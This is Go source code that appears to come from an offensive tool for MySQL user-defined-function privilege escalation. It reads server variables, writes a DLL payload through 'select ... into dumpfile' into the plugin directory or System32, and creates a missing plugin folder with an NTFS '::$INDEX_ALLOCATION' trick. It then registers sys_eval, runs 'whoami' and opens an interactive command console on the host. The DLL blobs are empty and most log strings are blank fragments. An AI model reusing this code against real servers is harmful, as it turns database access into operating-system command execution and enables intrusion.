var Win32dll = ""
var Win64dll = ""
var Linux32dll = ""
var Linux64dll = ""

// pplugin
func get_plugin(conn *sql.DB) (plugin_path string) {
	Info("Plugin")
	plugin, err := MysqlCMD("show variables like '%plugin%';", conn)
	if err != nil {
		Err(err)
	}

	if len(plugin) == 0 {
		Info("plugin_dir")
	} else {
		for i, a := range plugin {
			if a["Variable_name"] == "plugin_dir" {
				plugin_path = fmt.Sprintf("%v", plugin[i]["Value"])
				Info(fmt.Sprintf("Plugin%s", plugin_path))
			} else {
				Info("plugin_dir,dllC:\\Windows\\System32\\")
				plugin_path = ""
			}
		}
	}
	return plugin_path
}

// 
func get_compile(conn *sql.DB) (compile_version_string string, versioncompilemachine_value string) {
	Info("")
	compile, err := MysqlCMD("show variables like '%compile%';", conn)
	if err != nil {
		Err(err)
	}

	versioncompilemachine_value = fmt.Sprintf("%s", compile[0]["Value"])

	for i, j := range compile {
		if j["Variable_name"] == "version_compile_os" {
			compile_version := compile[i]["Value"]
			compile_version_string = fmt.Sprintf("%s", compile_version)
			Info(fmt.Sprintf("%v", compile_version_string))
		}
	}
	return compile_version_string, versioncompilemachine_value
}

// secur_file_priv
func get_secure_file_priv(conn *sql.DB) (secure_file_priv string, result bool) {
	Info("secure_file_priv")
	m, err := MysqlCMD("SHOW VARIABLES LIKE '%secure%';", conn)
	if err != nil {
		//Err(err)
		Info("show variables like '%secure%'")
		os.Exit(1)
	}
	for i, Variable := range m {
		// Check the Variable_name field of each map
		if Variable["Variable_name"] == "secure_file_priv" {
			// fmt.Println("Variable found!")
			result = true
			secure_file_priv = fmt.Sprintf("%s", m[i]["Value"])
		} else {
			result = false
		}
	}
	return secure_file_priv, result
}

func get_version(conn *sql.DB) (v float64) {
	m, err := MysqlCMD("select @@version;", conn)
	s := fmt.Sprintf("%s", m[0]["@@version"])
	parts1 := strings.Split(s, ".")
	version := fmt.Sprintf("%s.%s", parts1[0], parts1[1])
	v, err = strconv.ParseFloat(version, 64)
	if err != nil {
		fmt.Println(err)
	}

	return v
}

// udf
func Detail(conn *sql.DB, plugin_path string, dll string, udfname string, databasename string) {
	v := get_version(conn)
	Info("dll")
	_, err0 := MysqlCMD(fmt.Sprintf("update %s.temp set data=concat(\"\",%s);", databasename, dll), conn)
	if err0 != nil {
		Info("dll")
		os.Exit(1)
	}
	if v >= float64(5.1) {
		Info("dll")
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"%s%s.dll\";", databasename, plugin_path, udfname), conn)
		if err != nil {
			Info("dlllib/plugin")
			Info("utfslib/plugin")
			_, err := MysqlCMD(fmt.Sprintf("select '1' into dumpfile '%s::$INDEX_ALLOCATION'", plugin_path), conn)
			if err != nil {
				Info("ntfs")
				Info("dll")
				Err(err)
				os.Exit(1)
			}
		}
		Info("sys_eval")
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("")
			Err(err1)
			os.Exit(1)
		}
		Info("whoami")
		whoamiresult, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("")
			Err(err2)
			os.Exit(1)
		}
		fmt.Println(whoamiresult[0]["sys_eval('whoami')"])
		MysqlCMDConsole(conn)
		DropSYSEVAL(conn)

	} else if v < float64(5.1) && v >= float64(5.0) {
		Info("dll")
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"C:\\\\Windows\\\\System32\\\\%s.dll\"", databasename, udfname), conn)
		if err != nil {
			Info("dll")
			Err(err)
			os.Exit(1)
		}
		Info("sys_eval")
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("")
			Err(err1)
			os.Exit(1)
		}
		Info("whoami")
		whoamiresult, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("")
			Err(err2)
			os.Exit(1)
		}
		fmt.Println(whoamiresult[0]["sys_eval('whoami')"])
		MysqlCMDConsole(conn)
		DropSYSEVAL(conn)

	} else if v < float64(5.0) {
		_, err := MysqlCMD(fmt.Sprintf("select * from %s.temp into dumpfile \"C:\\Windows\\%s.dll\"", databasename, udfname), conn)
		if err != nil {
			Info("dll")
			Err(err)
			os.Exit(1)
		}
		_, err1 := MysqlCMD(fmt.Sprintf("create function sys_eval returns string soname '%s.dll';", udfname), conn)
		if err1 != nil {
			Info("")
			Err(err1)
			os.Exit(1)
		}
		_, err2 := MysqlCMD(fmt.Sprintf("select sys_eval('whoami');"), conn)
		if err2 != nil {
			Info("")
			Err(err2)
			os.Exit(1)
		}

	} else {
		Info("")
	}
}

